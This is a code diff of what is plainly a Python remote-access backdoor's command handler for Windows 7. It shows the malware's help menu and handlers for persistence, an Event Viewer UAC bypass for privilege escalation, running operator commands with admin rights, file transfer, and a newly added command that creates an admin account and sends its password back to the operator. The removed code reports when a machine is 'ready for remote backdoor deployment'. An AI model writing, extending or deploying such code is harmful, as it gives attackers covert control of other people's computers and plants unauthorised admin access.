@@ -131,9 +131,8 @@ PERSISTENCE:
 PRIVILEGE ESCALATION (Windows 7):
   check_privs   - Check current privilege level
   escalate      - Perform Event Viewer UAC bypass
-  escalate_force - Force privilege escalation
-  elevate <cmd> - Execute command with elevated privileges
-  test_admin    - Check if running as administrator
+  elevate <cmd> - Execute command with admin privileges
+  create_admin  - Create admin user for remote access
 
 SYSTEM:
   <command>     - Execute any system command
@@ -316,180 +315,67 @@ SYSTEM:
             except Exception as e:
                 reliable_send("Persistence start error: " + str(e))
                 
-        # Removed stop and status commands - persistence runs permanently
-
         # PRIVILEGE ESCALATION COMMANDS
-        elif command == 'check_privs':
-            try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
-            except Exception as e:
-                reliable_send("Check privileges error: " + str(e))
-                
         elif command == 'escalate':
             try:
                 if privilege_escalator is None:
                     privilege_escalator = Windows7PrivilegeEscalator()
-                success, results = privilege_escalator.escalate_privileges()
                 
-                # Format the results nicely
-                result_text = f"PRIVILEGE ESCALATION ATTEMPT COMPLETE\n"
-                result_text += f"SUCCESS: {success}\n\n"
+                success, message = privilege_escalator.escalate_privileges()
                 
-                if isinstance(results, dict):
-                    for method, result in results.items():
-                        if isinstance(result, dict):
-                            result_text += f"Method: {method}\n"
-                            result_text += f"  Success: {result.get('success', 'Unknown')}\n"
-                            result_text += f"  Result: {result.get('result', 'No details')}\n\n"
-                        else:
-                            result_text += f"Method: {method} -> {str(result)}\n"
+                if success:
+                    reliable_send("SUCCESS: " + message)
                 else:
-                    result_text += f"Results: {str(results)}\n"
-                
-                # Add current admin status
-                import ctypes
-                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-                result_text += f"\nCurrent Admin Status: {is_admin}"
-                
-                reliable_send(result_text)
+                    reliable_send("FAILED: " + message)
+                    
             except Exception as e:
                 reliable_send("Escalation error: " + str(e))
-                
-        elif command == 'escalate_force':
-            try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                
-                result_text = "FORCING PRIVILEGE ESCALATION (Event Viewer UAC Bypass):\n\n"
-                
-                # Use our simplified, confirmed working method
-                success, result = privilege_escalator.escalate_privileges()
-                
-                result_text += f"Event Viewer UAC Bypass: {'SUCCESS' if success else 'FAILED'}\n"
-                result_text += f"Details: {result}\n\n"
-                
-                # Check admin status
-                import ctypes
-                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-                result_text += f"Current Admin Status: {is_admin}\n"
-                
-                if success and is_admin:
-                    result_text += "PRIVILEGE ESCALATION CONFIRMED - NOW RUNNING AS ADMIN!\n"
-                elif success and not is_admin:
-                    result_text += "UAC bypass executed successfully, but process may need restart for full admin privileges.\n"
-                
-                reliable_send(result_text)
-            except Exception as e:
-                reliable_send("Force escalation error: " + str(e))
-                
-        elif command == 'test_admin':
-            try:
-                import ctypes
-                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-                reliable_send(f"Administrator: {is_admin}")
-            except Exception as e:
-                reliable_send("Admin test error: " + str(e))
                 
         elif command.startswith('elevate '):
             try:
                 if privilege_escalator is None:
                     privilege_escalator = Windows7PrivilegeEscalator()
                 
-                # Extract the command to run with elevated privileges
-                cmd_to_run = command[8:]  # Remove 'elevate ' prefix
+                admin_command = command[8:]  # Remove 'elevate ' prefix
+                success, result = privilege_escalator.execute_admin_command(admin_command)
                 
-                result_text = f"EXECUTING WITH ELEVATED PRIVILEGES:\n"
-                result_text += f"Command: {cmd_to_run}\n\n"
-                
-                success, output = privilege_escalator.execute_with_elevated_privileges(cmd_to_run)
-                
-                result_text += f"Success: {success}\n"
-                result_text += f"Output:\n{output}\n"
-                
-                # Check admin status after execution
-                import ctypes
-                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-                result_text += f"\nCurrent Admin Status: {is_admin}"
-                
-                reliable_send(result_text)
+                if success:
+                    reliable_send("SUCCESS: " + result)
+                else:
+                    reliable_send("FAILED: " + result)
+                    
             except Exception as e:
-                reliable_send("Elevated execution error: " + str(e))
+                reliable_send("Elevated command error: " + str(e))
                 
-        elif command == 'privesc_report':
+        elif command == 'create_admin':
             try:
                 if privilege_escalator is None:
                     privilege_escalator = Windows7PrivilegeEscalator()
-                report = privilege_escalator.generate_windows7_report()
-                # Send abbreviated report to avoid overwhelming the connection
-                brief_report = {
-                    'current_privileges': report.get('current_privileges'),
-                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
-                    'total_opportunities': len(report.get('escalation_opportunities', {}))
-                }
-                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
-            except Exception as e:
-                reliable_send("Report error: " + str(e))
                 
-        elif command == 'remote_privesc_test':
-            try:
-                # Import and run the comprehensive remote privilege test
-                from remote_privesc_test import RemotePrivescTest
+                success, username, password, message = privilege_escalator.create_admin_user()
                 
-                test = RemotePrivescTest()
-                results = test.run_silent_test()
-                
-                # Format results for remote display
-                output_lines = []
-                output_lines.append("REMOTE PRIVILEGE ESCALATION TEST RESULTS")
-                output_lines.append("=" * 60)
-                
-                # Initial status
-                initial = results["initial_status"]
-                output_lines.append("\n[INITIAL STATUS]")
-                output_lines.append(f"  Administrator: {initial['is_admin']}")
-                output_lines.append(f"  Admin Access: {initial['admin_access']}")
-                output_lines.append(f"  SAM Access: {initial['can_read_sam']}")
-                output_lines.append(f"  System32 Write: {initial['can_write_system32']}")
-                
-                # Escalation results
-                if "escalation_attempt" in results:
-                    escalation = results["escalation_attempt"]
-                    output_lines.append("\n[ESCALATION ATTEMPT]")
-                    output_lines.append(f"  Success: {escalation['success']}")
-                    output_lines.append(f"  Final Status: {escalation['final_admin_status']}")
-                    
-                    if isinstance(escalation['details'], dict):
-                        output_lines.append("  Method Results:")
-                        for method, result in escalation['details'].items():
-                            # Truncate long results for network transmission
-                            truncated_result = str(result)[:100] + "..." if len(str(result)) > 100 else str(result)
-                            output_lines.append(f"    {method}: {truncated_result}")
-                
-                # Post-escalation capabilities
-                post = results["post_escalation"]
-                output_lines.append("\n[CAPABILITY TEST]")
-                output_lines.append(f"  Create Admin User: {post['can_create_admin_user']}")
-                output_lines.append(f"  Modify Registry: {post['can_modify_registry']}")
-                output_lines.append(f"  System File Access: {post['can_access_system_files']}")
-                output_lines.append(f"  Elevated Commands: {post['can_run_elevated_commands']}")
-                
-                # Overall assessment
-                output_lines.append("\n[ASSESSMENT]")
-                if results["initial_status"]["is_admin"] or \
-                   (results.get("escalation_attempt", {}).get("success", False)):
-                    output_lines.append("  Status: PRIVILEGE ESCALATION SUCCESSFUL")
-                    output_lines.append("  Ready for: Remote backdoor deployment")
+                if success:
+                    reliable_send(f"SUCCESS: Admin user created")
+                    reliable_send(f"Username: {username}")
+                    reliable_send(f"Password: {password}")
+                    reliable_send(f"Use 'runas /user:{username} cmd' for admin shell")
                 else:
-                    output_lines.append("  Status: PRIVILEGE ESCALATION FAILED")
-                    output_lines.append("  Issue: Cannot gain administrative privileges")
+                    reliable_send("FAILED: " + message)
+                    
+            except Exception as e:
+                reliable_send("Admin user creation error: " + str(e))
                 
-                reliable_send("\n".join(output_lines))
+        elif command == 'check_privs':
+            try:
+                if privilege_escalator is None:
+                    privilege_escalator = Windows7PrivilegeEscalator()
+                
+                current_user = privilege_escalator.get_current_user()
+                reliable_send("Current privileges: " + current_user)
                 
             except Exception as e:
-                reliable_send(f"Remote privilege test error: {str(e)}")
-                
+                reliable_send("Privilege check error: " + str(e))
+
         # FILE OPERATIONS
         elif command[:8] == 'download':
             # If the command starts with 'download', upload a file to the remote host
